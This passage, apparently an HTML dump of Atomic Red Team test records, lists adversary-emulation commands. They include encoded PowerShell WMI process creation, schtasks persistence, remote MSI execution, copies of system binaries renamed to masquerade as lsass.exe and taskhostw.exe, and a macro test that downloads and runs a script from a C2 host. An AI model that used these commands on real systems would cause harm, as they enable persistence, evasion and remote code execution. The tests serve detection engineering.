<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 7db7a7f9-9531-4840-9b30-46220135441c</li>
<li><strong>name</strong>: Create a Process using WMI Query and an Encoded Command</li>
<li>
<p><strong>description</strong>: Solarigate persistence is achieved via backdoors deployed via various techniques including using PowerShell with an EncodedCommand
 Powershell -nop -exec bypass -EncodedCommand <encoded command>
Where the –EncodedCommand, once decoded, would resemble:
  Invoke-WMIMethod win32_process -name create -argumentlist ‘rundll32 c:\windows\idmu\common\ypprop.dll _XInitImageFuncPtrs’ -ComputerName WORKSTATION
The EncodedCommand in this atomic is the following: Invoke-WmiMethod -Path win32_process -Name create -ArgumentList notepad.exe
You should expect to see notepad.exe running after execution of this test.
<a href="https://www.microsoft.com/security/blog/2020/12/18/analyzing-solorigate-the-compromised-dll-file-that-started-a-sophisticated-cyberattack-and-how-microsoft-defender-helps-protect/">Solarigate Analysis from Microsoft</a></p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: powershell -exec bypass -e SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AUABhAHQAaAAgAHcAaQBuADMAMgBfAHAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIABjAHIAZQBhAHQAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIABuAG8AdABlAHAAYQBkAC4AZQB4AGUA</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1047</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: f9f2fe59-96f7-4a7d-ba9f-a9783200d4c9</li>
<li><strong>name</strong>: Creating W32Time similar named service using schtasks</li>
<li><strong>description</strong>: Creating W32Time similar named service (win32times) using schtasks just like threat actor dubbed "Operation Wocao"</li>
<li><strong>platforms</strong>: ['windows']</li>
<li>
<p><strong>command</strong>: schtasks /create /ru system /sc daily /tr "cmd /c powershell.exe -ep bypass -file c:\T1036.004_NonExistingScript.ps1" /tn win32times /f
schtasks /query /tn win32times</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li>
<p><strong>cleanup_command</strong>: schtasks /tn win32times /delete /f</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1036.004</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 44a4bedf-ffe3-452e-bee4-6925ab125662</li>
<li><strong>name</strong>: Msiexec.exe - Execute Remote MSI file</li>
<li>
<p><strong>description</strong>: Execute arbitrary MSI file retrieved remotely. Less commonly seen in application installation, commonly seen in malware execution. The MSI executes a built-in JScript payload that launches powershell.exe.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: #{msi_exe} /q /i "#{msi_payload}"</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1218.007</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 5ba5a3d1-cf3c-4499-968a-a93155d1f717</li>
<li><strong>name</strong>: Masquerading as Windows LSASS process</li>
<li><strong>description</strong>: Copies cmd.exe, renames it, and launches it to masquerade as an instance of lsass.exe.</li>
</ul>
<p>Upon execution, cmd will be launched by powershell. If using Invoke-AtomicTest, The test will hang until the 120 second timeout cancels the session</p>
<ul>
<li><strong>platforms</strong>: ['windows']</li>
<li>
<p><strong>command</strong>: copy %SystemRoot%\System32\cmd.exe %SystemRoot%\Temp\lsass.exe
%SystemRoot%\Temp\lsass.exe /B</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li>
<p><strong>cleanup_command</strong>: del /Q /F %SystemRoot%\Temp\lsass.exe &gt;nul 2&gt;&amp;1</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1036.003</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: ac9d0fc3-8aa8-4ab5-b11f-682cd63b40aa</li>
<li><strong>name</strong>: Masquerading - powershell.exe running as taskhostw.exe</li>
<li><strong>description</strong>: Copies powershell.exe, renames it, and launches it to masquerade as an instance of taskhostw.exe.</li>
</ul>
<p>Upon successful execution, powershell.exe is renamed as taskhostw.exe and executed from non-standard path.</p>
<ul>
<li><strong>platforms</strong>: ['windows']</li>
<li>
<p><strong>command</strong>: copy %windir%\System32\windowspowershell\v1.0\powershell.exe %APPDATA%\taskhostw.exe /Y
cmd.exe /K %APPDATA%\taskhostw.exe</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li>
<p><strong>cleanup_command</strong>: del /Q /F %APPDATA%\taskhostw.exe &gt;nul 2&gt;&amp;1</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1036.003</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: bc15c13f-d121-4b1f-8c7d-28d95854d086</li>
<li><strong>name</strong>: Masquerading - non-windows exe running as windows exe</li>
<li><strong>description</strong>: Copies an exe, renames it as a windows exe, and launches it to masquerade as a real windows exe</li>
</ul>
<p>Upon successful execution, powershell will execute T1036.003.exe as svchost.exe from on a non-standard path.</p>
<ul>
<li><strong>platforms</strong>: ['windows']</li>
<li>
<p><strong>command</strong>: copy "#{inputfile}" #{outputfile}
try { $myT1036_003 = (Start-Process -PassThru -FilePath #{outputfile}).Id }
catch { $<em>; exit $</em>.Exception.HResult}
Stop-Process -ID $myT1036_003</p>
</li>
<li>
<p><strong>prereq_command</strong>: if (Test-Path "#{inputfile}") {exit 0} else {exit 1}</p>
</li>
<li>
<p><strong>get_prereq_command</strong>: New-Item -Type Directory (split-path "#{inputfile}") -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1036.003/bin/T1036.003.exe" -OutFile "#{inputfile}"</p>
</li>
<li>
<p><strong>cleanup_command</strong>: Remove-Item #{outputfile} -Force -ErrorAction Ignore</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1036.003</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 5202ee05-c420-4148-bf5e-fd7f7d24850c</li>
<li><strong>name</strong>: Office Generic Payload Download</li>
<li>
<p><strong>description</strong>: This Test uses a VBA macro to launch Powershell which will download a file from a user defined web server.
Required input agruments are c2_domain and file_name
Execution is handled by <a href="https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1">Invoke-MalDoc</a> to load and execute VBA code into Excel or Word documents.
Example for c2 server located at 127.0.0.1 for the file test.txt which is nested below the parent directory in the tests/my-test folder
Example input args for file in root directory c2-domain = 127.0.0.1, file-name = test.txt</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
$macroCode = Get-Content "#{macro_path}" -Raw
$URL = "#{c2_domain}" + "/" + "#{c2_parent_directory}"
$macroCode = $macroCode -replace 'serverPath', $URL -replace 'fileName', "#{file_name}"
Invoke-MalDoc -macroCode $macroCode -officeProduct "#{ms_product}"</p>
</li>
<li>
<p><strong>prereq_command</strong>: if (#{c2_domain}) (exit 0) else (exit 1)</p>
</li>
<li>
<p><strong>get_prereq_command</strong>: Write-Host "Destination c2 server domain name or IP address must be set and reachable for HTTP service"</p>
</li>
<li>
<p><strong>cleanup_command</strong>: Remove-Item "C:\Users\$env:username\Desktop#{file_name}" -ErrorAction Ignore</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1204.002</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
